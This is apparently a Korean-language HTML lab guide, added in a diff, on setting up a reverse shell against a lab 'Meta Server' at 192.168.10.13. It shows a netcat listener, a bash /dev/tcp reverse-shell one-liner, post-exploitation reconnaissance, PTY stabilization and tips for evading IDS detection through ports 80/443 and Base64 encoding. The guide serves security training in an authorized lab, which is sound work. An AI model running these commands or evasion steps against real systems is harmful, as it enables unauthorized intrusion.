@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="ko" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>네트워크 보안: 리버스 커넥션(Reverse Connection) 심화 실습</title>
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&family=Fira+Code:wght@400;500&display=swap');
+        body { 
+            font-family: 'Noto Sans KR', sans-serif; 
+            background-color: #020617; 
+            color: #f8fafc; 
+            margin: 0; padding: 0;
+            line-height: 1.8;
+        }
+        .terminal-bg { background-color: #020617; border: 1px solid #1e293b; }
+        .text-glow { text-shadow: 0 0 10px rgba(34, 211, 238, 0.4); }
+        .section-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(51, 65, 85, 0.5); backdrop-blur: xl; }
+        .code-block { font-family: 'Fira Code', monospace; }
+        .option-badge { background: rgba(34, 211, 238, 0.1); border: 1px solid rgba(34, 211, 238, 0.3); color: #22d3ee; padding: 2px 8px; border-radius: 4px; font-size: 0.75rem; font-family: 'Fira Code'; }
+        .location-tag { background: #0f172a; border: 1px dashed #334155; color: #94a3b8; padding: 4px 12px; border-radius: 6px; font-size: 0.7rem; font-weight: 700; display: inline-flex; align-items: center; gap: 6px; margin-bottom: 12px; }
+        .comment-text { color: #64748b; font-style: italic; }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #0ea5e9; }
+    </style>
+</head>
+<body class="antialiased pb-20">
+
+    <!-- Header: 기술 사양 및 타이틀 -->
+    <header class="border-b border-slate-800 bg-slate-900/50 sticky top-0 z-50 backdrop-blur-md">
+        <div class="max-w-6xl mx-auto px-6 py-8 flex justify-between items-center">
+            <div>
+                <div class="flex items-center gap-2 mb-2">
+                    <span class="bg-cyan-500 text-slate-900 px-2 py-0.5 text-[10px] font-black uppercase tracking-widest rounded-sm shadow-[0_0_10px_rgba(34,211,238,0.5)]">Cyber Security Lab</span>
+                    <span class="text-slate-500 font-mono text-[10px]">LAB-SEC-02 | Meta Server Intrusion</span>
+                </div>
+                <h1 class="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-blue-500 to-indigo-500 tracking-tight leading-tight">
+                    리버스 커넥션 (Reverse Connection)<br><span class="text-slate-100 text-2xl">대상: 메타 서버(Meta Server, 192.168.10.13)</span>
+                </h1>
+            </div>
+            <div class="text-right hidden md:block border-l border-slate-800 pl-6">
+                <div class="bg-red-500/10 text-red-400 border border-red-500/20 px-4 py-2 rounded-xl text-sm font-black font-mono shadow-lg">
+                    TARGET: 192.168.10.13
+                </div>
+                <p class="text-[10px] text-slate-500 mt-2 tracking-widest uppercase">System Architect Pro</p>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-6 py-16 space-y-24">
+
+        <!-- Section 1: 아키텍처 개요 -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
+                1. 아키텍처 개요 (Architecture Overview)
+            </h2>
+            <div class="section-card rounded-3xl p-10 shadow-2xl">
+                <p class="text-slate-300 text-lg mb-10 leading-relaxed">
+                    메타 서버(Meta Server) 내부망에 위치한 타깃은 외부 인바운드 연결을 강력하게 통제하고 있습니다. 하지만 서버 내부에서 외부로 나가는 아웃바운드(Outbound) 통신은 허용되는 경우가 많으므로, 이를 활용하여 리버스 셸(Reverse Shell)을 성립시킵니다.
+                </p>
+
+                <!-- 도식화 인포그래픽 -->
+                <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-8 shadow-inner">
+                    <h4 class="text-center font-bold text-slate-400 mb-8 text-xs tracking-widest uppercase">
+                        [도식: 리버스 커넥션 흐름도]
+                    </h4>
+                    <div class="flex flex-col md:flex-row items-center justify-between gap-4">
+                        <!-- Attacker -->
+                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-cyan-900/50 shadow-lg relative">
+                            <i data-lucide="terminal" class="w-12 h-12 text-cyan-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100 text-sm">공격자 (Listener)</div>
+                            <div class="text-[10px] text-slate-400 mt-1 font-mono">192.168.10.100:4444</div>
+                        </div>
+                        <!-- Arrow -->
+                        <div class="flex flex-col items-center">
+                            <i data-lucide="arrow-left" class="w-8 h-8 text-cyan-400 rotate-90 md:rotate-0"></i>
+                            <span class="text-[10px] font-black text-cyan-500 mt-1 italic">Backdoor Connection</span>
+                        </div>
+                        <!-- Target (Meta Server) -->
+                        <div class="flex-1 text-center p-6 bg-slate-800 rounded-xl border border-blue-900/50 shadow-lg">
+                            <i data-lucide="server" class="w-12 h-12 text-blue-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100 text-sm">메타 서버 (Meta Server)</div>
+                            <div class="text-[10px] text-slate-400 mt-1 font-mono text-blue-400 font-bold">192.168.10.13</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 2: 명령어 및 절차 -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
+                2. 실증 및 구현 (Implementation)
+            </h2>
+            <div class="space-y-16">
+
+                <!-- STEP 01 -->
+                <div class="section-card rounded-3xl p-10 shadow-2xl">
+                    <div class="location-tag"><i data-lucide="monitor" class="w-3 h-3"></i> 작업 위치: 공격자 터미널 (Kali Linux)</div>
+                    <div class="flex items-center gap-3 mb-6">
+                        <span class="bg-cyan-500 text-slate-900 w-8 h-8 rounded-full flex items-center justify-center text-xs font-black italic">01</span>
+                        <h3 class="text-xl font-bold text-slate-100">리스너 활성화 (Setting up Listener)</h3>
+                    </div>
+                    <div class="pl-12 space-y-6">
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <div class="bg-slate-900/50 p-4 rounded-xl border border-slate-800">
+                                <h5 class="text-xs font-bold text-cyan-400 mb-2 uppercase">Option Details</h5>
+                                <ul class="text-[11px] space-y-2 text-slate-400 font-mono">
+                                    <li>-l: Listen (포트를 열고 대기)</li>
+                                    <li>-v: Verbose (연결 상태 상세 출력)</li>
+                                    <li>-n: Numeric (IP 주소 확인 시 DNS 미사용)</li>
+                                    <li>-p: Port (대기할 포트 번호 지정)</li>
+                                </ul>
+                            </div>
+                        </div>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-xs shadow-inner relative">
+                            <div class="text-slate-200 mb-4">$ <span class="text-cyan-400">nc -lvnp 4444</span></div>
+                            <div class="text-slate-500 space-y-1">
+                                <div>listening on [any] 4444 ... <span class="comment-text"># 현재 공격자 머신의 4444 포트가 개방됨</span></div>
+                                <div class="text-cyan-400 mt-2 font-bold animate-pulse">connect to [192.168.10.100] from (UNKNOWN) [192.168.10.13] 58122 <span class="comment-text"># 타깃(메타 서버)으로부터 역방향 연결 성공</span></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- STEP 02 -->
+                <div class="section-card rounded-3xl p-10 shadow-2xl">
+                    <div class="location-tag"><i data-lucide="server" class="w-3 h-3"></i> 작업 위치: 메타 서버 (Meta Server, 192.168.10.13)</div>
+                    <div class="flex items-center gap-3 mb-6">
+                        <span class="bg-indigo-500 text-white w-8 h-8 rounded-full flex items-center justify-center text-xs font-black italic">02</span>
+                        <h3 class="text-xl font-bold text-slate-100">페이로드 실행 (Payload Execution)</h3>
+                    </div>
+                    <div class="pl-12 space-y-6">
+                        <p class="text-sm text-slate-400">취약점을 통해 대상 서버에서 아래 명령어를 실행하여 공격자에게 셸을 전달합니다.</p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm shadow-inner">
+                            <div class="text-slate-200 break-all">$ <span class="text-indigo-400">bash -i >& /dev/tcp/192.168.10.100/4444 0>&1</span></div>
+                        </div>
+                        <div class="bg-indigo-900/10 p-4 rounded-xl border border-indigo-900/30">
+                            <h5 class="text-xs font-bold text-indigo-300 mb-2"><i data-lucide="info" class="inline w-3 h-3"></i> 코드 분석 (Code Breakdown)</h5>
+                            <ul class="text-[11px] text-slate-400 space-y-2">
+                                <li><strong class="text-slate-200">bash -i</strong>: 대화형(Interactive) 배시 셸을 실행합니다.</li>
+                                <li><strong class="text-slate-200">>& /dev/tcp/...</strong>: 표준 출력(stdout)과 에러(stderr)를 해당 네트워크 소켓으로 전송합니다.</li>
+                                <li><strong class="text-slate-200">0>&1</strong>: 표준 입력(stdin)을 표준 출력 스트림으로 연결하여 공격자의 명령을 수신 가능하게 합니다.</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- STEP 03 -->
+                <div class="section-card rounded-3xl p-10 shadow-2xl">
+                    <div class="location-tag text-red-400 border-red-900/30"><i data-lucide="terminal" class="w-3 h-3"></i> 작업 위치: 공격자 터미널 (획득한 셸 내부)</div>
+                    <div class="flex items-center gap-3 mb-6">
+                        <span class="bg-red-500 text-white w-8 h-8 rounded-full flex items-center justify-center text-xs font-black italic">03</span>
+                        <h3 class="text-xl font-bold text-slate-100">침투 후 작업 (Post-Exploitation)</h3>
+                    </div>
+                    <div class="pl-12 space-y-8">
+                        
+                        <!-- Task 1 -->
+                        <div class="space-y-4">
+                            <h4 class="text-sm font-bold text-slate-200">A. 사용자 식별 및 권한 확인</h4>
+                            <div class="terminal-bg rounded-xl p-6 font-mono text-xs shadow-inner leading-relaxed">
+                                <div class="text-slate-200 mb-2">$ <span class="text-cyan-400">id && whoami && uname -a</span></div>
+                                <div class="text-slate-500 space-y-1">
+                                    <div>uid=1001(meta-user) gid=1001(meta-user) groups=1001(meta-user),27(sudo) <span class="comment-text"># 현재 계정의 UID/GID 및 sudo 그룹 소속 확인</span></div>
+                                    <div>meta-user <span class="comment-text"># 현재 세션의 사용자 이름</span></div>
+                                    <div>Linux meta-server 5.4.0-150-generic #167-Ubuntu SMP x86_64 GNU/Linux <span class="comment-text"># 커널 버전 정보 수집 (권한 상승 취약점 탐색용)</span></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Task 2 -->
+                        <div class="space-y-4">
+                            <h4 class="text-sm font-bold text-slate-200">B. 내부 네트워크 구성 파악</h4>
+                            <div class="terminal-bg rounded-xl p-6 font-mono text-xs shadow-inner leading-relaxed">
+                                <div class="text-slate-200 mb-2">$ <span class="text-cyan-400">ip addr show eth0</span></div>
+                                <div class="text-slate-500 space-y-1">
+                                    <div>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 <span class="comment-text"># 인터페이스 상태 활성</span></div>
+                                    <div>&nbsp;&nbsp;&nbsp;&nbsp;link/ether 08:00:27:ae:91:3c brd ff:ff:ff:ff:ff:ff <span class="comment-text"># MAC 주소 정보</span></div>
+                                    <div class="text-indigo-300">&nbsp;&nbsp;&nbsp;&nbsp;inet 192.168.10.13/24 brd 192.168.10.255 scope global eth0 <span class="comment-text"># 대상 서버의 내부 IP (192.168.10.13) 확정</span></div>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Section 3: 전문가 분석 -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight">
+                3. 아키텍트 인사이트 (Expert Insight)
+            </h2>
+            <div class="bg-slate-900/40 border border-slate-800 rounded-3xl p-10 shadow-2xl space-y-10">
+                <div class="flex flex-col md:flex-row gap-8">
+                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
+                        <div class="text-cyan-400 mb-4"><i data-lucide="zap" class="w-8 h-8"></i></div>
+                        <h4 class="font-bold text-slate-100 mb-2">세션 안정화 (Shell Stabilization)</h4>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            Bash 리버스 셸은 방향키 사용이나 Ctrl+C 시 세션이 종료되는 취약점이 있습니다. <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> 명령어를 통해 가상 터미널(PTY)을 생성하여 안정적인 작업 환경을 확보하는 것이 필수입니다.
+                        </p>
+                    </div>
+                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
+                        <div class="text-red-400 mb-4"><i data-lucide="shield-off" class="w-8 h-8"></i></div>
+                        <h4 class="font-bold text-slate-100">탐지 우회 전략 (Evasion)</h4>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            대부분의 보안 솔루션(IDS/IPS)은 4444 포트와 <code>/dev/tcp</code> 문자열을 탐지합니다. 실제 진단 시에는 HTTP(80) 또는 HTTPS(443) 포트를 사용하고, 페이로드를 Base64로 인코딩하여 전송함으로써 탐지 확률을 최소화해야 합니다.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer class="max-w-6xl mx-auto px-6 py-12 border-t border-slate-800 text-center">
+        <div class="text-slate-500 font-mono text-[10px] tracking-widest uppercase mb-4">
+            © 2026 CYBER DEFENSE LAB. ALL RIGHTS RESERVED.
+        </div>
+        <p class="text-slate-600 text-[10px] leading-relaxed max-w-2xl mx-auto italic">
+            본 실습 가이드는 인가된 환경에서의 취약점 분석 교육 목적으로 제작되었습니다.
+        </p>
+    </footer>
+
+    <script>
+        lucide.createIcons();
+    </script>
+</body>
+</html>
